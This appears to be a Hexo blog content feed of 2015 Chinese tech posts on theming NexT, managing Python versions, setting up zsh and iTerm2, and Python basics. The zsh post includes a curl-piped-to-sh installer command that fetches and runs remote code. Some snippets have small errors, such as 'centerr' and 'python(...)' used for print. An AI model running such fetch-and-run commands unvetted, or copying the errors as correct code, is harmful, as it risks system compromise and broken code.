block; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.menu-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line">    <span class="comment">//border: none;</span></span><br><span class="line">    <span class="attribute">transition-property</span>: background;</span><br><span class="line"></span><br><span class="line">    +mobile() &#123;</span><br><span class="line">      <span class="attribute">text-align</span>: left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;:hover &#123; <span class="attribute">background</span>: <span class="number">#e1e1e1</span>; &#125;       <span class="comment">//指针指到的时候背景色</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">a</span>::before &#123;</span><br><span class="line">      <span class="attribute">display</span>: none;</span><br><span class="line"></span><br><span class="line">      +mobile() &#123; <span class="attribute">display</span>: block; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; <span class="attribute">float</span>: none; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu-left</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  +mobile() &#123; <span class="attribute">float</span>: none; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu-item-icon</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Search 搜索栏</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.site-search</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">8px</span>;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">float</span>: none;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">background</span>: url(<span class="variable">$search-icon</span>) no-repeat <span class="number">0</span> <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">12px</span> <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="variable">$grey-dark</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">    &amp;:focus &#123; <span class="attribute">opacity</span>: <span class="number">1</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Post Expanded  文章</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.posts-expand</span> &#123;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-title</span>,</span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: <span class="variable">$site-meta-text-align</span>;</span><br><span class="line">    +mobile() &#123; <span class="attribute">text-align</span>: <span class="variable">$site-meta-text-align</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.post-eof</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post</span> &#123; <span class="attribute">margin-top</span>: <span class="number">80px</span>; &#125;</span><br><span class="line">  <span class="selector-class">.post</span>:first-child &#123; <span class="attribute">margin-top</span>: <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123;                       <span class="comment">//预览部分偏移量</span></span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-title</span> &#123;                      <span class="comment">//文章标题 </span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">26px</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">300</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-body</span> <span class="selector-tag">img</span> &#123; <span class="attribute">margin</span>: <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-tags</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">    <span class="selector-tag">a</span> &#123;</span><br><span class="line">      <span class="attribute">padding</span>: <span class="number">1px</span> <span class="number">5px</span>;</span><br><span class="line">      <span class="attribute">background</span>: <span class="variable">$whitesmoke</span>;        <span class="comment">//tags</span></span><br><span class="line">      <span class="comment">//border-bottom: none;        </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">a</span>:hover &#123; <span class="attribute">background</span>: <span class="variable">$grey-light</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.post-nav</span> &#123; <span class="attribute">margin-top</span>: <span class="number">10px</span>; &#125;     <span class="comment">//tag 与下方分隔栏的距离</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//阅读更多 按钮</span></span><br><span class="line"><span class="comment">//----------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.post-more-link</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$grey-dim</span>;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="variable">$grey-dim</span>;</span><br><span class="line">    <span class="attribute">transition-property</span>: border;</span><br><span class="line"></span><br><span class="line">    &amp;:hover &#123; <span class="attribute">border-bottom-color</span>: black; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Page - Post details    单独文章页 标题</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.page-post-detail</span> &#123;</span><br><span class="line">  <span class="selector-class">.post-title</span>,</span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123; <span class="attribute">text-align</span>: center; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123; <span class="attribute">margin-bottom</span>: <span class="number">60px</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pagination       主页 页数栏</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.pagination</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">40px</span> <span class="number">0px</span> <span class="number">0px</span> -<span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="comment">//background: $white;</span></span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Footer           页脚</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="variable">$white</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$grey-dim</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.footer-inner</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">text-align</span>: centerr;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; <span class="attribute">text-align</span>: center; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Helpers</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.full-image</span><span class="selector-class">.full-image</span><span class="selector-class">.full-image</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><h1 id="文字的设置"><a href="#文字的设置" class="headerlink" title="文字的设置"></a>文字的设置</h1><p><code>hexo/themes/next/languages/zh-Hans.yml</code><br>改成这样咯：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">footer:</span></span><br><span class="line"><span class="symbol">  powered:</span> <span class="string">"博客框架参见 - %s"</span></span><br><span class="line"><span class="symbol">  theme:</span> 主题使用参见</span><br></pre></td></tr></table></figure></p><p>这样的话，页脚还是挺不错的。</p><hr><p>至此告一段落，以后再加点击拷贝代码，header 悬浮等功能。<br>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> abc </tag>
            
            <tag> try </tag>
            
            <tag> hexo </tag>
            
            <tag> sublime </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>鸽的表</title>
      <link href="/2015/10-01-%E9%B8%BD%E7%9A%84%E8%A1%A8/"/>
      <url>/2015/10-01-%E9%B8%BD%E7%9A%84%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>October 1, 20158:44 PM 回家忘记带电源，鸽，明天回去拿，顺便补python笔记<br>2015年9月16日上午1:09 今天满课，寝室断网，鸽<br>2015年9月17日下午7:06 9月18号补考计算机网络，复习，鸽  </p><a id="more"></a><hr><p><strong>Todo</strong><br>-[ ] <a href="http://gaoryrt.github.io/2015/09/14/怎么使用github/" target="_blank" rel="noopener">怎么使用github</a><br>-[x] <a href="http://gaoryrt.github.io/2015/09/10/theme-my-theme/" target="_blank" rel="noopener">修改next主题</a><br>-[x] 还要写个关于<strong>计算机网络</strong>复习资料的<br>-[ ] python笔记<br>-[x] hexo 命令执行时的三行错误<br><code>sudo npm install hexo --no-optional --save</code><br>就解决了 </p><hr>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> try </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>升级Mac的python</title>
      <link href="/2015/09-30-upgrade-pyhton-on-mac/"/>
      <url>/2015/09-30-upgrade-pyhton-on-mac/</url>
      
        <content type="html"><![CDATA[<p>在前一篇 <a href="http://gaoryrt.github.io/2015/09/27/StartingPython/" target="_blank" rel="noopener">开始Python</a> 当中提到了安装新版本Python的方法<br>但是在shell当中使用<code>python</code>命令的时候还是依旧使用的老版本Python。<br>今天下午解决这个问题花了好长时间。<br><a id="more"></a> </p><hr><h1 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h1><ol><li>找的Python教程都是基于3.X版本的，跟2.X并不兼容  </li><li>shell当中使用<code>python</code>命令显示的Python版本依旧是2.7.10  </li><li>准备的编辑器是<code>Atom</code>或者<code>Sublime Text</code>，编译就交给shell了</li></ol><p>看了其他人的Python建议之后还是决定先把Vim当作普通编辑器，不要深入把它变成Python IDE了  </p><hr><h1 id="尝试解决"><a href="#尝试解决" class="headerlink" title="尝试解决"></a>尝试解决</h1><p>直接安装的话尝试了brew安装和<a href="https://www.python.org/downloads/" target="_blank" rel="noopener">直接下载</a>安装 </p><pre><code>brew install python //brew安装Python</code></pre><p>两种都是直接安装在<code>/Library/Frameworks/Python.framework/Versions/3.5</code>中<br>并没有<a href="http://jingyan.baidu.com/article/27fa7326e4809646f8271fc7.html" target="_blank" rel="noopener">帮助</a>我建立link，建立可执行文件<br>好像直接覆盖的话会有很多遗留问题，Sublime和Xcode都要用到Python2.7脚本<br>在Stack Overflow上面找了很久，试过的都不管用，主要是因为Mac OSX 10.11 El Captain的rootless这个新特性<br>初衷是为了用户的安全呗  不把root权限交给用户  搞得我现在sudo出来都报错告诉我<br><code>Operation not permitted</code><br>这下我连复制Python版本目录到一起都不行了，更别说更改路径了<br>我就尝试着在shell配置中添加alias直接调用IDLE中新版Python<br>这个应该是能够成功的，但是需要调用的<code>python3.5</code>是一个隐藏文件，我在shell当中也只是<code>tab</code>自动补全的时候才添加的<br>之后的尝试也以找不到目标文件告终  </p><hr><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>然后居然是万能的知乎上找到了答案<br>是一个叫做<code>pythonbrew</code>的shell插件<br>能够下载切换全局局部的特定Python版本，简单操作易切换<br>安装配置参照👉<a href="https://github.com/utahta/pythonbrew" target="_blank" rel="noopener">pythonbrew</a>👈<br>安装配置成功后下载了3.4和2.7两个版本的Python并切换了过去<br>太方便了好么！！！</p><hr><h1 id="看图"><a href="#看图" class="headerlink" title="看图"></a>看图</h1><p><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ewktr4gy20j20jd0fswfv.jpg" alt="image"><br><strong>👆没有改的时候，原版Python👆</strong><br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewktr2tvj3j20jd0fs41a.jpg" alt="image"><br><strong>👆使用pythonbrew转换之后👆</strong><br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ewktr0wym7j20jd0fs411.jpg" alt="image"><br><strong>👆可用的版本，我只下载了两个👆</strong><br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ewktqy8cjjj20jd0fs401.jpg" alt="image"><br><strong>👆换回来之后👆</strong>  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> howto </tag>
            
            <tag> abc </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>开始zsh+vim+iTerm</title>
      <link href="/2015/09-28-%E5%BC%80%E5%A7%8Bzsh-vim/"/>
      <url>/2015/09-28-%E5%BC%80%E5%A7%8Bzsh-vim/</url>
      
        <content type="html"><![CDATA[<p>bash是mac中terminal自带的shell<br>把它换成zsh，这个的功能要多得多<br>恩 vim是神的编辑器，emacs是编辑器之神<br>mac自带vim，但是需要升级加插件等过程来调教<br><br>iTerm2则是另外一款替代原有terminal的软件，可以设置的选项很多，至少颜色显示比自带的terminal多<br><a id="more"></a>  </p><h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><p>使用这个命令可以看到你的系统有几个shell<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shells</span><br></pre></td></tr></table></figure></p><p>回显是这个<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>bash</span><br><span class="line"><span class="regexp">/bin/</span>csh</span><br><span class="line"><span class="regexp">/bin/</span>ksh</span><br><span class="line"><span class="regexp">/bin/</span>sh</span><br><span class="line"><span class="regexp">/bin/</span>tcsh</span><br><span class="line"><span class="regexp">/bin/</span>zsh</span><br></pre></td></tr></table></figure></p><p>有zsh就不用安装了，直接用下面的命令设置默认shell就行<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s <span class="regexp">/bin/</span>zsh</span><br></pre></td></tr></table></figure></p><p>github上面有个<a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">oh my zsh</a>写的很清楚了，跟着一步一步来。  </p><p>然后直接打开新的terminal就行了  </p><p>zsh的配置文件在这里：<code>~/.zshrc</code><br>直接打开没啥东西的，需要用这个oh my zsh来调教：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></p><p>之后你的<code>~/.zshrc</code>文件里面就有东西了<br>比如<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes" target="_blank" rel="noopener">主题</a>自选  </p><blockquote><p>我使用的是一款叫做<code>bullet-train</code>的主题，效果如图<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewjavx0wzfg20mi0gk4bw.gif" alt="image"><br>有个蓝色的箭头很是花哨啊。。。然后可以显示这个目录下的git状态  </p></blockquote><h2 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h2><p>修改文件<code>~/.zshrc</code>中的<code>ZSH_THEME</code>一行，改成这个<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ZSH_THEME</span>=<span class="string">"bullet-train"</span></span><br></pre></td></tr></table></figure></p><p>重新打开一个terminal就行了<br>如果没有箭头，只有方框+问号的话，还需要安装powerline<br>这是一个字体增强的软件，就是往字体库里面新加了一个字体<br>在github可以直接下载然后执行<code>install.sh</code>来安装👉<a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">Powerline-patched font</a><br>一步一步的安装方法参见👉<a href="https://powerline.readthedocs.org/en/latest/installation/linux.html#font-installation" target="_blank" rel="noopener">powerline的文档</a><br>然后在你的终端gui设置里面，把字体改成后缀为<code>powerline</code>的字体就行了  </p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>就是更改<code>.zshrc</code>的内容<br>我就新增了几个<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">plugins=(git autojump osx sudo)</span><br><span class="line">/<span class="regexp">/新增了几个插件：autojump、osx、sudo，分别是快速跳转，osx增强，和双击esc添加sudo</span></span><br><span class="line"><span class="regexp">[[ -s ~/</span>.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~<span class="regexp">/.autojump/etc</span><span class="regexp">/profile.d/autojump</span>.sh</span><br><span class="line">source /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">z</span>.<span class="title">sh</span></span></span><br><span class="line">/<span class="regexp">/可能autojump需要重新安装吧，git上有详细过程</span></span><br><span class="line"><span class="regexp">alias vim='mvim '</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/懒得输入mvim了</span></span><br><span class="line"><span class="regexp">alias cls='clear'</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/清屏</span></span><br><span class="line"><span class="regexp">alias -s py=vi</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/py结尾的用vi打开</span></span><br><span class="line"><span class="regexp">alias hdg='hexo d -g'</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/hexo deploy的快捷键</span></span><br></pre></td></tr></table></figure></p><p>以后更新博客就方便多了，不用在finder里找hexo文件夹然后<code>Go2shell</code>然后<code>hexo d -g</code>了<br>直接<code>j hexo</code> 然后 <code>hdg</code>就好了</p><hr><h1 id="安装iTerm2"><a href="#安装iTerm2" class="headerlink" title="安装iTerm2"></a>安装iTerm2</h1><p>看图<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewjbfumlbyj20iy0elq3p.jpg" alt="terminal"><br><strong>👆terminal  </strong></p><p><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewjbfm6iupj20iy0fn750.jpg" alt="iTerm2"><br><strong>👆iterm2  </strong>注意看颜色<br>下载地址看这里👉<a href="http://www.iterm2.com" target="_blank" rel="noopener">iTerm官网</a><br>然后看这篇文章👉<a href="http://wulfric.me/2015/08/iterm2/" target="_blank" rel="noopener">你应该知道的 iTerm2 使用方法–MAC终端工具</a>👈这个博客写的很好的说  </p><hr><h1 id="vim的安装"><a href="#vim的安装" class="headerlink" title="vim的安装"></a>vim的安装</h1><p>mac自带的vim是7.3版本的<br>尝试升级失败，开了ss都一直是<code>Error: Failed to download resource &quot;vim&quot;</code><br>问了SOF都没有办法，按照一个建议直接上macvim了<br>macvim就遍地都是了，支持常用的Mac快捷键，还有个GUI<br>下载👉<a href="http://www.macupdate.com/app/mac/25988/macvim" target="_blank" rel="noopener">MacVim</a><br>直接下载<code>.tbz</code>的包，解压之后把<code>MacVim.app</code>拷贝到程序里面<br>如果你想直接在shell中使用 <code>mvim</code> 命令的话  </p><ol><li><code>cd /usr/local</code></li><li><code>sudo mkdir bin</code></li><li><code>sudo cp -f /你的mvim的路径/mvim /usr/local/bin/</code></li></ol><p>在zsh的配置文件里添加这个把原来的老版本vim给替换掉，<strong>macvim里面也是vim</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> vim=<span class="string">'mvim '</span></span><br></pre></td></tr></table></figure></p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> howto </tag>
            
            <tag> abc </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>开始Python</title>
      <link href="/2015/09-27-StartingPython/"/>
      <url>/2015/09-27-StartingPython/</url>
      
        <content type="html"><![CDATA[<p> 开始学习python<br> <a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014316090478912dab2a3a9e8f4ed49d28854b292f85bb000" target="_blank" rel="noopener">廖雪峰的官方网站</a>上面有python3的详细教程<br> 按照这个一步一步来吧<br> <a id="more"></a></p><hr><h1 id="在MAC上安装Python"><a href="#在MAC上安装Python" class="headerlink" title="在MAC上安装Python"></a>在MAC上安装Python</h1><blockquote><p>MacOS 10.2 (Jaguar), 10.3 (Panther), 10.4 (Tiger) and 10.5 (Leopard) already include various versions of Python.<br>  这几个版本都是自带了的，虽然是2.7版本的<br>  2.X和3.X不兼容  </p></blockquote><p>  最新版的python是3.5.0的<br>  1.如果有<code>homebrew</code>的话可以用命令: <code>brew install python3</code><br>  但是不晓得是网络问题还是系统版本问题，反正电脑烫了好一会儿没有安装好。<br>  2.还可以在<a href="https://www.python.org/downloads/mac-osx/" target="_blank" rel="noopener">python官网下载地址</a>下载安装包，我搬百度云算了。  </p><blockquote><p>链接: <a href="http://pan.baidu.com/s/1dD6UojJ" target="_blank" rel="noopener">http://pan.baidu.com/s/1dD6UojJ</a> 密码: kjjk  </p></blockquote><p>  我用的这个.pkg安装的，安装完了之后还送我两个app:<br>  IDLE.app  和 PythonLauncher.app<br>  IDLE是命令行交互环境，PythonLauncher是Python的解释器  </p><h1 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h1><p>安装好了可能要重启一下<br>打开IDLE就可以开始了！！！  </p><blockquote><p>交互式环境的提示符是 <code>&gt;&gt;&gt;</code>  </p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(<span class="string">'hello world'</span>) </span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>使用这个来退出 -&gt; <code>quit()</code>  </p><hr><h1 id="用文件编辑器编辑保存并在终端中运行"><a href="#用文件编辑器编辑保存并在终端中运行" class="headerlink" title="用文件编辑器编辑保存并在终端中运行"></a>用文件编辑器编辑保存并在终端中运行</h1><p><strong>python文件都是以<code>.py</code>结尾的</strong></p><h2 id="用文件编辑器编辑"><a href="#用文件编辑器编辑" class="headerlink" title="用文件编辑器编辑"></a>用文件编辑器编辑</h2><p>这几天下载了atom<br>比起sublime text，<code>cmd + z</code>的时候不会把我拼音算进去。<del>方便多了哟</del><br>新建文件<code>python.py</code>用atom打开<br>编辑<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">python</span><span class="params">(<span class="string">'hello world'</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>保存  </p><h2 id="在终端中运行"><a href="#在终端中运行" class="headerlink" title="在终端中运行"></a>在终端中运行</h2><p>先要cd到<code>.py</code>所在的文件夹然后再使用<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> <span class="keyword">python</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></p><p>输出为<code>hello world</code></p><h3 id="直接运行-py文件"><a href="#直接运行-py文件" class="headerlink" title="直接运行.py文件"></a>直接运行<code>.py</code>文件</h3><p>在<code>.py</code>文件首行加上这一句<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br></pre></td></tr></table></figure></p><p>然后使用<code>chmod a+x</code>来给文件运行权限  </p><blockquote><p>简单说一下<br>chmod是添加更改权限命令<br>a是指所有的用户组，包括root用户组，文件拥有者的用户组，还有其他用户组:<br>u 表示该文件的拥有者[user]，<br>g 表示与该文件的拥有者属于组(group)，<br>o 表示其他用户[other]，<br>a 表示这三者皆是[all]。<br>+x是指添加执行权限。<br>+x是执行权限，+r是阅读权限，+w是写入权限<br>- 表示取消权限。<br>= 表示唯一设定权限。<br>r 表示有可读取的权限，<br>w 表示有可写入的权限，<br>x 表示有可执行的权限  </p></blockquote><h3 id="在终端中直接使用命令行交互环境"><a href="#在终端中直接使用命令行交互环境" class="headerlink" title="在终端中直接使用命令行交互环境"></a>在终端中直接使用命令行交互环境</h3><p>在终端里面直接<code>$ python</code>就行了<br>你看到最后是<code>&gt;&gt;&gt;</code>而不是常见的<code>$</code>，那么你就在python命令行交互环境中了<br>注意  在命令行中要用<code>print()</code>才有输出，然而在命令行交互环境中只能一行一行，立即执行<br>那么，在命令行交互环境中运行<code>.py</code>文件的话。。。<br>是的，每一行结果都会打印出来。而需要输入才能执行的语句会报错。</p><hr><h3 id="I-O"><a href="#I-O" class="headerlink" title="I/O"></a>I/O</h3><p>直接上程序<br><code>InputNOutput.py</code><br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3 </span></span><br><span class="line">name = <span class="keyword">input</span>(<span class="string">'please enter your name: '</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'hello,'</span>, name)</span><br></pre></td></tr></table></figure></p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><p>跟java、c的差不多，我就写写我看到的不同点、新知识  </p><ul><li><code>print(&#39;空&#39;,&#39;格&#39;)</code> 出来是 <code>空 格</code>，中间的逗号变成了空格 </li><li>关于中文乱码，尝试在首行加上<br><code># -*- coding: utf-8 -*-</code> 或者<br><code># -*- coding: unicode -*-</code> </li><li>可以直接在<code>print()</code>里面加函数例如   <figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="string">'x'</span>,<span class="string">'*'</span>,<span class="string">'y'</span>,<span class="string">'='</span>,<span class="keyword">int</span>(<span class="keyword">input</span>(<span class="string">'请输入第一个数'</span>))*<span class="keyword">int</span>(<span class="keyword">input</span>(<span class="string">'请输入第二个数'</span>)))</span><br></pre></td></tr></table></figure></li></ul><p>执行的话会输入两次再输出  </p><ul><li>但是<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(x,<span class="string">'*'</span>,y,<span class="string">'='</span>,<span class="keyword">int</span>(<span class="keyword">input</span>(<span class="string">'请输入第一个数'</span>,x))*<span class="keyword">int</span>(<span class="keyword">input</span>(<span class="string">'请输入第二个数'</span>,y)))</span><br></pre></td></tr></table></figure></li></ul><p>并不能编译成功，因为x和y在定义之前就调用了  